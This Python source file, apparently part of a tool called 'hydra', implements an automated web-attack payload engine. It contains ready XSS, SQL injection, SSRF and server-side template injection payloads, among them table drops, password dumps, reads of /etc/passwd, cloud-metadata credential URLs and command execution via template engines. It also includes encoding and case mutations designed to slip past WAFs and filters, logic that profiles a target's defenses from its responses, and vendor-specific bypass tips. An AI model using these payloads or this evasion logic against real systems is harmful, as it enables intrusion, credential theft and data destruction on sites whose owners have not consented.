"""
╔══════════════════════════════════════════════════════════════╗
║  Autonomous Payload Generation Engine                       ║
║  Context-aware mutation, WAF bypass, encoding mutation,     ║
║  polyglot payloads, adaptive response-based evolution       ║
╚══════════════════════════════════════════════════════════════╝
"""

import logging
import random
import re
import time
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field

logger = logging.getLogger("hydra.payload_engine")


class PayloadType(str, Enum):
    XSS = "xss"
    SQLI = "sqli"
    SSRF = "ssrf"
    SSTI = "ssti"
    XXE = "xxe"
    LFI = "lfi"
    RCE = "rce"
    CRLF = "crlf"
    REDIRECT = "redirect"
    HEADER_INJECTION = "header_injection"
    POLYGLOT = "polyglot"


class MutationStrategy(str, Enum):
    ENCODING = "encoding"
    CASE_SWAP = "case_swap"
    DOUBLE_ENCODE = "double_encode"
    UNICODE = "unicode"
    NULL_BYTE = "null_byte"
    COMMENT_INJECT = "comment_inject"
    WHITESPACE = "whitespace"
    CONCAT = "concat"
    HEX = "hex"


@dataclass
class PayloadResult:
    """Result of a payload test."""
    payload: str
    payload_type: PayloadType
    reflected: bool = False
    executed: bool = False
    blocked: bool = False
    status_code: int = 0
    response_length: int = 0
    response_snippet: str = ""
    detection: str = ""        # waf, filter, sanitizer, none
    mutations_applied: List[str] = field(default_factory=list)


@dataclass
class FilterProfile:
    """Inferred filter/WAF profile for a target."""
    waf_detected: str = ""         # cloudflare, akamai, aws_waf, mod_security, none
    blocks_tags: bool = False      # <script>, <img>, etc.
    blocks_events: bool = False    # onerror, onload, etc.
    blocks_quotes: bool = False    # single/double quotes
    blocks_semicolons: bool = False
    encodes_html: bool = False
    strips_null: bool = False
    blocks_keywords: List[str] = field(default_factory=list)  # UNION, SELECT, etc.
    allowed_chars: Set[str] = field(default_factory=set)
    max_length: int = 0


# ──────────────────────────────────────────────
#  Payload Templates
# ──────────────────────────────────────────────

XSS_PAYLOADS = [
    # Basic
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    # Event handlers
    '<img src=x onerror="alert(1)">',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video><source onerror=alert(1)>',
    # Encoding bypasses
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
    '<svg/onload=\u0061lert(1)>',
    # DOM
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    # Template literals
    '${alert(1)}',
    '{{constructor.constructor("alert(1)")()}}',
    # Mutation XSS
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; DROP TABLE users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' UNION SELECT username,password FROM users--",
    "-1' UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://0x7f000001",
    "http://[::1]",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://127.1",
    "gopher://127.0.0.1:25/_HELO",
    "dict://127.0.0.1:6379/INFO",
    "file:///etc/passwd",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{php}echo `id`;{/php}",
]

POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik//cjrla//76telerik0telerik0//hacked/\\telerik",
    "'\"-->]]>*/</script><script>alert(1)</script>",
    "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}",  # SSTI polyglot
    "'-var x=1;alert(x)-'",
]


class PayloadMutator:
    """Mutate payloads to bypass filters and WAFs."""

    @staticmethod
    def url_encode(payload: str) -> str:
        return "".join(f"%{ord(c):02x}" if not c.isalnum() else c for c in payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        return "".join(f"%25{ord(c):02x}" if not c.isalnum() else c for c in payload)

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        return "".join(f"&#{ord(c)};" for c in payload)

    @staticmethod
    def unicode_encode(payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def case_swap(payload: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        return payload.replace("<", "%00<").replace(">", "%00>")

    @staticmethod
    def comment_break(payload: str) -> str:
        """Break SQL keywords with comments."""
        for kw in ["SELECT", "UNION", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE"]:
            payload = payload.replace(kw, f"{kw[:2]}/**/{''.join(kw[2:])}")
        return payload

    @staticmethod
    def whitespace_mutate(payload: str) -> str:
        """Replace spaces with alternative whitespace."""
        alternatives = ["%09", "%0a", "%0d", "/**/", "+"]
        return payload.replace(" ", random.choice(alternatives))

    def apply_mutations(self, payload: str, strategies: List[MutationStrategy]) -> List[str]:
        """Apply multiple mutation strategies and return variants."""
        variants = [payload]
        mutation_map = {
            MutationStrategy.ENCODING: self.url_encode,
            MutationStrategy.DOUBLE_ENCODE: self.double_url_encode,
            MutationStrategy.UNICODE: self.unicode_encode,
            MutationStrategy.HEX: self.hex_encode,
            MutationStrategy.CASE_SWAP: self.case_swap,
            MutationStrategy.NULL_BYTE: self.null_byte_inject,
            MutationStrategy.COMMENT_INJECT: self.comment_break,
            MutationStrategy.WHITESPACE: self.whitespace_mutate,
        }
        for strategy in strategies:
            fn = mutation_map.get(strategy)
            if fn:
                variants.append(fn(payload))
        return variants


class PayloadEngine:
    """
    Autonomous Payload Generation Engine.

    Capabilities:
      - Context-aware payload selection
      - WAF/filter profiling from responses
      - Adaptive payload mutation
      - Polyglot payload generation
      - Encoding bypass chains
      - Learning from success/failure
      - Response-based filter inference
    """

    def __init__(self):
        self._mutator = PayloadMutator()
        self._history: List[PayloadResult] = []
        self._filter_profiles: Dict[str, FilterProfile] = {}
        self._success_payloads: Dict[PayloadType, List[str]] = {}
        self._blocked_payloads: Dict[PayloadType, List[str]] = {}

    def get_payloads(self, payload_type: PayloadType, count: int = 10) -> List[str]:
        """Get base payloads for a given type."""
        templates = {
            PayloadType.XSS: XSS_PAYLOADS,
            PayloadType.SQLI: SQLI_PAYLOADS,
            PayloadType.SSRF: SSRF_PAYLOADS,
            PayloadType.SSTI: SSTI_PAYLOADS,
            PayloadType.POLYGLOT: POLYGLOT_PAYLOADS,
        }
        base = templates.get(payload_type, XSS_PAYLOADS)
        # Prioritize historically successful payloads
        successful = self._success_payloads.get(payload_type, [])
        combined = successful + [p for p in base if p not in successful]
        return combined[:count]

    def generate_adaptive(self, payload_type: PayloadType, target: str = "",
                          filter_profile: Optional[FilterProfile] = None,
                          count: int = 20) -> List[str]:
        """Generate adaptive payloads based on filter profile."""
        base = self.get_payloads(payload_type, count)
        fp = filter_profile or self._filter_profiles.get(target, FilterProfile())

        # Select mutation strategies based on filter profile
        strategies = []
        if fp.encodes_html:
            strategies.append(MutationStrategy.UNICODE)
        if fp.blocks_tags:
            strategies.extend([MutationStrategy.CASE_SWAP, MutationStrategy.NULL_BYTE])
        if fp.blocks_keywords:
            strategies.extend([MutationStrategy.COMMENT_INJECT, MutationStrategy.WHITESPACE])
        if fp.waf_detected:
            strategies.extend([MutationStrategy.DOUBLE_ENCODE, MutationStrategy.HEX])

        # If no filter detected, use base + light encoding
        if not strategies:
            strategies = [MutationStrategy.ENCODING, MutationStrategy.CASE_SWAP]

        all_payloads = []
        for payload in base:
            all_payloads.append(payload)  # Original
            variants = self._mutator.apply_mutations(payload, strategies)
            all_payloads.extend(variants)

        # Deduplicate while preserving order
        seen: Set[str] = set()
        unique = []
        for p in all_payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)

        return unique[:count]

    def record_result(self, result: PayloadResult):
        """Record a payload test result for learning."""
        self._history.append(result)
        if result.executed:
            self._success_payloads.setdefault(result.payload_type, []).append(result.payload)
        elif result.blocked:
            self._blocked_payloads.setdefault(result.payload_type, []).append(result.payload)

    def infer_filter(self, results: List[PayloadResult], target: str = "") -> FilterProfile:
        """Infer filter/WAF profile from test results."""
        fp = FilterProfile()

        for r in results:
            if r.blocked:
                # Analyze what got blocked
                if "<script" in r.payload.lower() or "<img" in r.payload.lower():
                    fp.blocks_tags = True
                if "onerror" in r.payload.lower() or "onload" in r.payload.lower():
                    fp.blocks_events = True
                if "'" in r.payload or '"' in r.payload:
                    fp.blocks_quotes = True
                if ";" in r.payload:
                    fp.blocks_semicolons = True
                for kw in ["UNION", "SELECT", "INSERT", "DELETE", "DROP"]:
                    if kw.lower() in r.payload.lower():
                        if kw not in fp.blocks_keywords:
                            fp.blocks_keywords.append(kw)

                # WAF detection from response
                if r.detection:
                    fp.waf_detected = r.detection

            elif r.reflected and not r.executed:
                fp.encodes_html = True

        if target:
            self._filter_profiles[target] = fp
        return fp

    def suggest_bypass_strategy(self, filter_profile: FilterProfile) -> List[str]:
        """Suggest bypass strategies based on inferred filters."""
        strategies = []
        if filter_profile.blocks_tags:
            strategies.append("Try SVG-based payloads (<svg/onload=...>)")
            strategies.append("Use tag-less payloads: javascript: protocol, data: URI")
        if filter_profile.blocks_events:
            strategies.append("Use lesser-known events: ontoggle, onbegin, onanimationend")
        if filter_profile.encodes_html:
            strategies.append("Try DOM-based vectors (no server reflection needed)")
            strategies.append("Use JavaScript template literals: ${...}")
        if filter_profile.blocks_quotes:
            strategies.append("Use backticks: `alert(1)`")
            strategies.append("Use String.fromCharCode() to avoid quotes")
        if filter_profile.blocks_keywords:
            strategies.append("Use comment injection: SEL/**/ECT, UNI/**/ON")
            strategies.append("Use alternative whitespace: %09, %0a")
            strategies.append("Case variation: SeLeCt, uNiOn")
        if filter_profile.waf_detected == "cloudflare":
            strategies.append("Cloudflare: Try chunked transfer encoding")
            strategies.append("Cloudflare: Use lesser-known Content-Types")
        elif filter_profile.waf_detected == "akamai":
            strategies.append("Akamai: Try parameter pollution")
        return strategies

    def get_summary(self) -> Dict[str, Any]:
        return {
            "total_tests": len(self._history),
            "successful": sum(1 for r in self._history if r.executed),
            "blocked": sum(1 for r in self._history if r.blocked),
            "filter_profiles": len(self._filter_profiles),
            "payload_types": list({r.payload_type.value for r in self._history}),
        }
